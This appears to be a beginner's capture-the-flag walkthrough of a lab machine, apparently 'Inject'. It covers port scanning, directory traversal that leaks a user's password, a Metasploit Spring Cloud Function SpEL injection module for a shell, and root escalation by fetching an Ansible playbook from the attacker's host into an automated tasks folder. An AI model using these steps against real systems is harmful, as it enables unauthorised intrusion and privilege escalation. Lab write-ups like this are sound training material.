Nmap scanning:

~~~
nmap 10.10.11.204 -sC -sV
~~~

~~~
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-18 09:15 EDT
Nmap scan report for 10.10.11.204
Host is up (0.43s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA)
|   256 d51c81c97b076b1cc1b429254b52219f (ECDSA)
|_  256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519)
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.03 seconds
~~~

![[inject.png]]

~~~
gobuster dir -u http://10.10.11.204:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
~~~


after do the dir enumuration we that the page the upload dir
http://10.10.11.204:8080/uplaod
upload the file in the upload page and capture the request by burp suite
![[Pasted image 20230624162735.png]]

we capture the request and find that the page is vuln to the  Directory traversal vuln

![[home_fli.png]]

in home dir there are two usr and enter inti the frank dir there we find the phil password

![[usr_pass.png]]
username and password
<username>phil</username>
DocPhillovestoInject123
![[springboot.png]]

after this this use spring cloud function  and try  exploit this with metasploit
with this exploit 

~~~
exploit/multi/http/spring_cloud_function_spel_injection
~~~


![[msf 1.jpeg]]

to get the sudo permission we type shell 

![[root.jpeg]]

user flag:922fce7e7e9097cf108ff424497a83984

~~~
meterpreter > cd home
meterpreter > shell
Process 104640 created.
Channel 4 created.
ls
frank
phil
su phil
Password: DocPhillovestoInject123
ls -la
total 16
drwxr-xr-x  4 root  root  4096 Feb  1 18:38 .
drwxr-xr-x 18 root  root  4096 Feb  1 18:38 ..
drwxr-xr-x  5 frank frank 4096 Feb  1 18:38 frank
drwxr-xr-x  6 phil  phil  4096 Jun 24 11:10 phil
cd phil
ls -la 
total 6104
drwxr-xr-x 6 phil phil    4096 Jun 24 11:10 .
drwxr-xr-x 4 root root    4096 Feb  1 18:38 ..
lrwxrwxrwx 1 root root       9 Feb  1 07:40 .bash_history -> /dev/null
-rw-r--r-- 1 phil phil    3771 Feb 25  2020 .bashrc
drwx------ 2 phil phil    4096 Feb  1 18:38 .cache
drwx------ 3 phil phil    4096 Jun 23 18:51 .gnupg
drwxrwxr-x 3 phil phil    4096 Jun 24 09:42 .local
-rw-r--r-- 1 phil phil     807 Feb 25  2020 .profile
-rwxrwxr-x 1 phil phil 3104768 Jun 24 11:00 pspy64
-rwxrwxr-x 1 phil phil 3104768 Jun 24 11:00 pspy64.1
drwxrwxr-x 2 phil phil    4096 Jun 23 21:28 .ssh
-rw-r----- 1 root phil      33 Jun 23 18:27 user.txt
-rw------- 1 phil phil    2860 Jun 24 09:42 .viminfo
cd opt/
bash: line 4: cd: opt/: No such file or directory
cd /opt
ls -la
total 12
drwxr-xr-x  3 root root 4096 Oct 20  2022 .
drwxr-xr-x 18 root root 4096 Feb  1 18:38 ..
drwxr-xr-x  3 root root 4096 Oct 20  2022 automation
cd automation
ls
tasks
cd tasks
ls -la
total 12
drwxrwxr-x 2 root staff 4096 Jun 24 17:22 .
drwxr-xr-x 3 root root  4096 Oct 20  2022 ..
-rw-r--r-- 1 root root   150 Jun 24 17:22 playbook_1.yml
nano playbook_2.yml
Error opening terminal: unknown.
cd /tmp
ls -la
total 12288
drwxrwxrwt 19 root  root    12288 Jun 24 17:24 .
drwxr-xr-x 18 root  root     4096 Feb  1 18:38 ..
-rwxr-xr-x  1 frank frank     250 Jun 24 10:55 AzGtD
-rw-r--r--  1 frank frank     336 Jun 24 11:36 dquGM.b64
-rw-r--r--  1 frank frank      43 Jun 24 10:34 exploit.sh
drwxrwxrwt  2 root  root     4096 Jun 23 18:27 .font-unix
drwxr-xr-x  2 frank frank    4096 Jun 24 10:58 hsperfdata_frank
drwxrwxrwt  2 root  root     4096 Jun 23 18:27 .ICE-unix
-rwxr-xr-x  1 frank frank     250 Jun 24 11:36 lathF
-rwxr-xr-x  1 frank frank     250 Jun 24 16:26 luNVs
-rw-r--r--  1 frank frank     336 Jun 24 10:55 mSUiI.b64
-rwxr-xr-x  1 frank frank      54 Jun 23 18:33 poc.sh
-rwxrwxr-x  1 phil  phil  3104768 Jun 23 19:19 pruebaroy
-rwxrwxr-x  1 phil  phil  3104768 Jun 23 19:02 pspy64
-rw-rw-r--  1 phil  phil  3104768 Jun 23 19:02 pspy64.1
-rw-rw-r--  1 phil  phil  3104768 Jun 23 19:02 pspy64.2
-rw-r--r--  1 frank frank       0 Jun 24 13:08 pwned
-rw-r--r--  1 frank frank      55 Jun 23 18:32 rev.sh
-rw-r--r--  1 frank frank     336 Jun 24 16:26 RtGZT.b64
-rw-r--r--  1 frank frank       0 Jun 24 17:24 shell
-rw-r--r--  1 frank frank      42 Jun 23 21:19 shell.sh
drwx------  3 root  root     4096 Jun 23 18:27 systemd-private-e700e1cfb6b74dc0afe76f8e3408c354-ModemManager.service-3hjsFg
drwx------  3 root  root     4096 Jun 23 18:27 systemd-private-e700e1cfb6b74dc0afe76f8e3408c354-systemd-logind.service-nSY9xi
drwx------  3 root  root     4096 Jun 23 18:32 systemd-private-e700e1cfb6b74dc0afe76f8e3408c354-systemd-resolved.service-omnqjh
drwx------  3 root  root     4096 Jun 23 18:27 systemd-private-e700e1cfb6b74dc0afe76f8e3408c354-systemd-timesyncd.service-l3QtQg
drwx------  3 root  root     4096 Jun 23 22:14 systemd-private-e700e1cfb6b74dc0afe76f8e3408c354-upower.service-BBiaFf
-rw-r--r--  1 frank frank     336 Jun 24 17:05 TAlwi.b64
drwxrwxrwt  2 root  root     4096 Jun 23 18:27 .Test-unix
drwx------  2 phil  phil     4096 Jun 23 18:51 tmux-1001
drwx------  3 frank frank    4096 Jun 24 10:58 tomcat.8080.13513602979617444320
drwx------  3 frank frank    4096 Jun 24 09:30 tomcat.8080.15667244264941750413
drwx------  3 frank frank    4096 Jun 23 18:27 tomcat.8080.9098981749498746902
drwx------  2 frank frank    4096 Jun 24 10:58 tomcat-docbase.8080.15310688241814284721
-rwxr-xr-x  1 frank frank      54 Jun 24 10:54 tota.sh
-rwxr-xr-x  1 frank frank     250 Jun 24 17:05 UiGVW
-rwxr-xr-x  1 frank frank     250 Jun 24 17:18 VCOVH
drwx------  2 root  root     4096 Jun 23 18:27 vmware-root_742-2991137376
-rw-r--r--  1 frank frank     336 Jun 24 09:26 Vuuuy.b64
-rw-r--r--  1 frank frank     336 Jun 24 12:18 WwoVk.b64
-rwxr-xr-x  1 frank frank     250 Jun 24 12:18 Wxueq
drwxrwxrwt  2 root  root     4096 Jun 23 18:27 .X11-unix
drwxrwxrwt  2 root  root     4096 Jun 23 18:27 .XIM-unix
-rwxr-xr-x  1 frank frank     250 Jun 24 09:26 XMCXY
-rw-r--r--  1 frank frank       0 Jun 23 18:35 XV
-rw-r--r--  1 frank frank     336 Jun 24 17:18 zdAqt.b64
wget http://10.10.14.240:8080/playbook_2.yml
--2023-06-24 17:28:37--  http://10.10.14.240:8080/playbook_2.yml
Connecting to 10.10.14.240:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 117 [application/octet-stream]
Saving to: ‘playbook_2.yml’

     0K                                                       100% 3.80M=0s

2023-06-24 17:28:39 (3.80 MB/s) - ‘playbook_2.yml’ saved [117/117]

/bin/bash -p

whoami
root
ls
AzGtD
dquGM.b64
exploit.sh
hsperfdata_frank
lathF
luNVs
mSUiI.b64
playbook_2.yml
poc.sh
pruebaroy
pspy64
pspy64.1
pspy64.2
pwned
rev.sh
RtGZT.b64
shell
shell.sh
systemd-private-e700e1cfb6b74dc0afe76f8e3408c354-ModemManager.service-3hjsFg
systemd-private-e700e1cfb6b74dc0afe76f8e3408c354-systemd-logind.service-nSY9xi
systemd-private-e700e1cfb6b74dc0afe76f8e3408c354-systemd-resolved.service-omnqjh
systemd-private-e700e1cfb6b74dc0afe76f8e3408c354-systemd-timesyncd.service-l3QtQg
systemd-private-e700e1cfb6b74dc0afe76f8e3408c354-upower.service-BBiaFf
tmux-1001
tomcat.8080.13513602979617444320
tomcat.8080.15667244264941750413
tomcat.8080.9098981749498746902
tomcat-docbase.8080.15310688241814284721
tota.sh
VCOVH
vmware-root_742-2991137376
Vuuuy.b64
WwoVk.b64
Wxueq
XMCXY
XV
zdAqt.b64
cat /root/root.txt
8fec796e536c2a7e051d4d0ab3c41239

~~~

 **YAML files containing a list of ordered tasks that should be executed on a remote server to complete a task or reach a certain goal**, such as to set up a LEMP environment.

![[flag 1.jpeg]]


root flag :8fec796e536c2a7e051d4d0ab3c41239

this my first machine!!!😁😁🔥🔥

https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/

